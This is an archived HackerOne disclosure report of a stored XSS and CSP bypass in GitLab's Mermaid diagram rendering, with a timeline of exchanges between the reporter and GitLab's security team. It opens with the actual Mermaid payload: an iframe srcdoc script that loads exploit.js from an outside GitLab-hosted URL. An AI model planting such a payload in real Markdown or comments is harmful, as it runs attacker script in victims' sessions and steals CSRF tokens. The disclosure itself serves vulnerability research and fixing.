```mermaid
%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
flowchart
  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
```

---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-dom
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - DOM"
enriched: true
date: 2021-10-18
submitted: 2021-05-30T01:49:50.159Z
bounty_usd: null
votes: 42
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "saleemrashid"
source: "https://hackerone.com/reports/1212822"
title: "Stored XSS in Mermaid when viewing Markdown files"
---
# Stored XSS in Mermaid when viewing Markdown files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 42 | **Program:** GitLab | **Disclosed:** 2021-10-18

- Report: [https://hackerone.com/reports/1212822](https://hackerone.com/reports/1212822)
- CWE: Cross-site Scripting (XSS) - DOM
- Submitted: 2021-05-30T01:49:50.159Z

## Report summary

#

## Timeline

- **Report Filed**
- **2021-05-30** @saleemrashid: On re-reading this, I realize that "RCE" implies that there's server-side code execution which this isn't. This is just XSS and a CSP bypass, but I wrote "RCE" in an attempt to make it clear the XSS is useful and can execute JS and steal CSRF tokens, etc. Sorry if that causes any confusion :)
- **2021-05-31** @h1_analyst_everton: Hi @saleemrashid,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@glassofbeer
- **Report Title Updated**
- **Report Severity Updated**
- **Report Pending Program Review**
- **2021-06-03** @rchan: Hey @saleemrashid,

This is a great find, thank you for taking the time to submit this vulnerability.

Do you have any suggestions how we should fix this vulnerability?

Thanks,
Ron
GitLab Security Team
- **Report Triaged**
- **Bounty Awarded**
- **2021-06-04** @gitlab-securitybot: ETA for fix:

Hi @saleemrashid,

The issue you reported is currently scheduled to be fixed by 2021-07-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2021-06-04** @saleemrashid: Hi @rchan,

Thank you for the initial bounty!

As a stop-gap measure, you could probably add some more fields to `secure` in the `mermaid.initialize` invocation, which would prevent directives from overriding them. An improved short-term fix for this issue would be to remove the directive-handling code entirely from GitLab's version of Mermaid.

It would probably be worth notifying upstream about the `htmlLabels` bug (where the string `"false"` is handled differently), because I don't think that's intended behaviour -- though a lot of the Mermaid security features seem to also be broken (e.g. `securityLevel: "antiscript"` has plenty of trivial bypasses).

I think the long-term solution for GitLab should be to sandbox Mermaid (e.g. in an `iframe`) because the way it's written isn't very conducive to ensuring there's no XSS.

Also, I noticed this was triaged as "User interaction: Required". I'm curious what kind of XSS you would consider no interaction required -- I assumed this one would be because it is triggered without the user interacting with anything on the page and the page could be opened by another webpage.
- **2021-06-07** @saleemrashid: I also tested that this is possible anywhere that GFM is used, e.g. issue comments. For example, the following works (using `"themeCSS"` to hide the Mermaid diagram)

~~~

~~~

This is probably more impactful than Markdown files because an attacker could use this in issue comments on popular repositories to target more users.
- **2021-06-08** @rchan: Hey @saleemrashid,

Thank you very much for the feedback, this is very helpful.

About the `User interaction: Required`, we usually consider any type of XSS to be in this category in normal circumstances, because of the nature of XSS. Unless there's a stored XSS found in, say, our home page, then we might review this CVSS setting.

Thank you for this great bug, I wish you the best of luck for the next one.

Thanks,
Ron
GitLab Security Team
- **2021-06-08** @saleemrashid: That makes sense! Thanks for the clarification.
- **Bounty Awarded**
- **2021-07-01** @gitlab-securitybot: ETA for fix:

Hi @saleemrashid,

The issue you reported is currently scheduled to be fixed by 2021-08-31.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **External User Joined**
- **External User Joined**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
